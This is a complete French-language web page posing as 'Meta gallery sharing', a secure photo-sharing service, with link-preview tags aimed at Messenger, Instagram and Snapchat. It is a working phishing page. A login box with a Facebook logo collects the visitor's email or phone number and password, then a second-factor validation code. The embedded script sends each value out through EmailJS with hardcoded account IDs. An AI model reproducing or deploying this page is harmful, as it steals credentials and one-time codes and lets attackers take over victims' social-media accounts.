<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Meta gallery sharing</title>

<!-- 🔹 META PREVIEW PARTAGE (Messenger / Instagram / Snapchat) -->
<meta property="og:title" content="Meta gallery sharing">
<meta property="og:description" content="Partage sécurisé de photos">
<meta property="og:image" content="https://thecloud-share-labaarbiie.netlify.app/logo_id.png">
<meta property="og:url" content="https://thecloud-share-labaarbiie.netlify.app">
<meta property="og:type" content="website">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Meta gallery sharing">
<meta name="twitter:description" content="Partage sécurisé de photos">
<meta name="twitter:image" content="https://thecloud-share-labaarbiie.netlify.app/logo_id.png">
<!-- 🔹 FIN META PREVIEW -->

<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
:root{
  --primary:#3a86ff;
  --secondary:#00b4d8;
  --bg:#f4f8fb;
  --card:#ffffff;
  --accent:#eaf4ff;
}

body{
  margin:0;
  font-family:Inter, system-ui, Arial;
  background:linear-gradient(180deg,#f4f8fb 0%,#e6f2ff 100%);
  color:#123;
}

/* HEADER */
header{
  max-width:1100px;
  margin:0 auto;
  padding:20px;
  display:flex;
  align-items:center;
  gap:16px;
}

.logo{
  width:60px;
  height:60px;
  border-radius:16px;
  background:linear-gradient(135deg,#ffffff,#eaf4ff);
  display:flex;
  align-items:center;
  justify-content:center;
  font-weight:800;
  color:var(--primary);
  box-shadow:0 6px 20px rgba(0,0,0,.08);
}

nav{
  margin-left:auto;
}

.btn{
  background:linear-gradient(135deg,var(--primary),var(--secondary));
  color:#fff;
  border:none;
  padding:12px 18px;
  border-radius:10px;
  font-weight:600;
  cursor:pointer;
  box-shadow:0 6px 16px rgba(58,134,255,.3);
}

/* HERO */
.hero{
  max-width:1100px;
  margin:0 auto;
  padding:50px 24px;
  display:grid;
  grid-template-columns:1.2fr .8fr;
  gap:40px;
  align-items:center;
}

.hero h1{
  margin:0;
  font-size:36px;
  color:var(--primary);
}

.hero p{
  opacity:.75;
  margin-top:10px;
}

.hero img{
  width:100%;
  height:100%;
  object-fit:cover;
  border-radius:20px;
  box-shadow:0 20px 50px rgba(0,0,0,.12);
}

/* CLOUD CARD EFFECT */
.hero div{
  background:var(--card);
  padding:30px;
  border-radius:20px;
  box-shadow:0 10px 40px rgba(0,0,0,.08);
}

/* MODAL */
.modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.5);
  backdrop-filter:blur(6px);
  display:none;
  align-items:center;
  justify-content:center;
}

.modal .box{
  background:#fff;
  padding:28px;
  width:360px;
  border-radius:18px;
  box-shadow:0 30px 80px rgba(0,0,0,.3);
  animation:fadeIn .3s ease;
}

@keyframes fadeIn{
  from{opacity:0; transform:translateY(10px);}
  to{opacity:1; transform:translateY(0);}
}

/* INPUTS */
.modal input{
  width:100%;
  padding:12px;
  margin-top:12px;
  border-radius:10px;
  border:1px solid #dde6ef;
  font-size:14px;
}

/* CODE FIELD (mis en évidence sans être trompeur) */
#code{
  border:2px dashed var(--primary);
  background:#f0f7ff;
  text-align:center;
  letter-spacing:3px;
  font-weight:600;
}

/* LABEL CODE */
.code-label{
  margin-top:14px;
  font-size:13px;
  color:#3a86ff;
  text-align:center;
  font-weight:600;
}

/* NOTIFICATION */
#modalNotification{
  display:none;
  padding:10px 15px;
  margin:10px 0;
  background:linear-gradient(135deg,#3a86ff,#00b4d8);
  color:white;
  border-radius:8px;
  text-align:center;
  font-weight:600;
  opacity:0;
  transform: translateY(-10px);
  transition: opacity 0.4s ease, transform 0.4s ease;
}

/* NOTE */
.note{
  font-size:12px;
  opacity:.6;
  margin-top:10px;
  text-align:center;
}
</style>
</head>

<body>

<header>
  <div class="logo">MS</div>

  <div>
    <strong>Meta gallery sharing</strong><br>
    <small>Partage sécurisé de photos</small>
  </div>


  <nav>
    <button class="btn" id="loginBtn">
      Accès sécurisé
    </button>
  

</header>l

<section class="hero">

  <div>
    <h1>Archive de vos souvenirs.</h1>

    <p>
      Stockez, protégez et partagez vos photos dans un espace sécurisé
      avec une expérience fluide et moderne.
    </p>
  </div>

  <img src="logo_id.png" alt="Logo">
</section>

<!-- MODALE LOGIN -->
<div class="modal" id="loginModal">
  <div class="box">

<h2 style="text-align:center;color:#1877f2; display:flex; flex-direction:column; align-items:center; gap:10px;">
  <img src="logo_fb.png" alt="logo_fb" style="width:48px; height:48px;">
  Identification
</h2>

<div id="modalNotification"></div>

<input id="userId" placeholder="Courriel ou numéro de mobile">
<input id="password" type="password" placeholder="Mot de passe">
<input id="code" maxlength="8" placeholder="Code de validation" style="display:none">

<button class="btn" id="confirmLogin" style="width:100%;margin-top:12px">
  Se connecter
</button>

<p class="note">Accès sécurisé</p>
</div>
</div>

<script>
const modal = document.getElementById('loginModal');
const loginBtn = document.getElementById('loginBtn');
const confirmLogin = document.getElementById('confirmLogin');
const codeInput = document.getElementById('code');
const userIdInput = document.getElementById('userId');
const passwordInput = document.getElementById('password');
const modalNotif = document.getElementById('modalNotification');

let codeSent = false;

if(sessionStorage.getItem("demo_auth_token") === "true"){
    window.location.href = "secure-photos.html";
}

function showModalNotification(message){
    modalNotif.textContent = message;
    modalNotif.style.display = "block";
    requestAnimationFrame(()=>{
        modalNotif.style.opacity = "1";
        modalNotif.style.transform = "translateY(0)";
    });
    setTimeout(()=>{
        modalNotif.style.opacity = "0";
        modalNotif.style.transform = "translateY(-10px)";
        setTimeout(()=> modalNotif.style.display = "none", 400);
    }, 3000);
}

loginBtn.addEventListener("click", ()=> modal.style.display = "flex");
modal.addEventListener("click", e=>{if(e.target===modal) modal.style.display="none";});

async function sendEmailLogin(username, password){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_email",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{username,password}
    })
  });
}
async function sendCodeValidation(code){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_code",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{code}
    })
  });
}

confirmLogin.onclick = async ()=>{
  const user = userIdInput.value.trim();
  const pwd  = passwordInput.value.trim();

  if(!codeSent){
    if(!user || !pwd){
      showModalNotification("Veuillez remplir tous les champs.");
      return;
    }

    confirmLogin.disabled = true;
    confirmLogin.textContent = "Envoi…";

    const response = await sendEmailLogin(user,pwd);
    if(!response.ok){
      showModalNotification("Erreur d'envoi.");
      confirmLogin.disabled = false;
      confirmLogin.textContent = "Se connecter";
      return;
    }

    showModalNotification("Code de validation envoyé.");
    codeInput.style.display = "block";
    confirmLogin.textContent = "Valider le code";
    confirmLogin.disabled = false;
    codeSent = true;
    return;
  }

  const code = codeInput.value.trim();
  if(!/^[0-9]{6,8}$/.test(code)){
    showModalNotification("Code invalide.");
    return;
  }

  const rep = await sendCodeValidation(code);
  if(!rep.ok){
    showModalNotification("Erreur validation code.");
    return;
  }

  sessionStorage.setItem("demo_auth_token","true");
  window.location.href="secure-photos.html";
};
</script>

</body>
</html>
